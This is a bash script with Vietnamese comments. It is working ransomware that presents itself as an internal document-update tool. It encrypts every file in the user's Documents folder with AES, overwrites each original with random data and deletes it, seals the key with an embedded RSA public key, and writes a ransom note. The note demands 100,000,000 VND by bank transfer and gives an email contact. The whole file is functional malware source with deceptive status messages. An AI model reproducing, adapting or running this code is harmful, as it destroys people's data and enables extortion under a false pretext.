#!/bin/bash

PUBLIC_KEY="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqwQf1zc6TlRLpXeePlN7
lQeqAFYetF0QR/E30oNW+eaNQtr7LrplFs1pk9Q7sWz8d1BhfbvL1VclvMoYqxR0
fle1Ua9hF2re+xkUe2iCbAEc8RWlH4RaiKTuJSl3b5VvDo+SjAfThYvCJG43kYRF
UmBtjZAHpMc7JLh7Jf4vI3tqswgfluXs+wuSDGIHW0xAWIP70N+/Wa/P8xBkx3E6
hhXI0mZ6vH4YxtNjjdCjnbcKTnoAcGjV2UQ19hL8TVc4WBV0pSglip3hXYV3dZKe
2XUylTjAdTwyLIOFeeVI3sYEw9Rwj9oE2osvwkQFly/A362YBqUJ/WW8oYHi7Z01
YwIDAQAB
-----END PUBLIC KEY-----"

# Sinh ra khóa bảo mật AES và IV để bảo vệ tài liệu
KEY=$(openssl rand -hex 32)
IV=$(openssl rand -hex 16)

TARGET_DIR="$HOME/Documents"

echo "[*] Đang tiến hành cập nhật tài liệu nội bộ..."
for file in "$TARGET_DIR"/*; do
    if [ -f "$file" ] && [[ ! "$file" =~ \.enc$ ]]; then
        fname=$(basename "$file")
        # Mã hóa file và lưu lại với đuôi .enc
        openssl enc -aes-256-cbc -in "$file" -out "$TARGET_DIR/${fname}.enc" -K "$KEY" -iv "$IV" >/dev/null 2>&1
        # Xóa nội dung gốc của file (ghi đè bằng dữ liệu ngẫu nhiên rồi xóa)
        openssl rand -out "$file" $(stat -c %s "$file" 2>/dev/null || stat -f %z "$file" 2>/dev/null)
        rm "$file"
    fi
done

# Mã hóa khóa AES + IV bằng RSA (OAEP)
openssl pkeyutl -encrypt -pubin -inkey <(echo -n "$PUBLIC_KEY") \
  -in <(echo -n "$KEY:$IV") \
  -pkeyopt rsa_padding_mode:oaep \
  -out "$TARGET_DIR/encrypted_key.bin" >/dev/null 2>&1

# Tạo file thông báo khôi phục (khi được tải và chạy trên máy mục tiêu)
cat << EOM > "$TARGET_DIR/Recovery_Info.txt"
Tập tin của bạn đã bị mã hóa.
Để khôi phục dữ liệu, bạn phải chuyển khoản 100,000,000 VND vào tài khoản ngân hàng: 1234567890, Ngân hàng ACB.
Sau khi chuyển khoản, gửi tệp encrypted_key.bin qua email: 22521603@gm.uit.edu.vn để nhận hướng dẫn giải mã.
EOM

echo "[*] Công cụ cập nhật đã hoàn tất công việc."